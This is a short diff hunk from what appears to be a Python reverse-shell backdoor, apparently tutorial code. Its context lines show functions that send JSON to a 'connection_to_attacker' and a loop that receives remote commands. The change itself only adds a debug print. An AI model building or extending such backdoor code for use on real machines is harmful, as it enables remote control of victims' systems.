@@ -13,6 +13,7 @@ def reliable_send(data):
     connection_to_attacker.send(json_data.encode())
 
 def shell():
+    print("Inside the shell functions")
     while True:
         command = reliable_recv()
         print("Command Recieved")
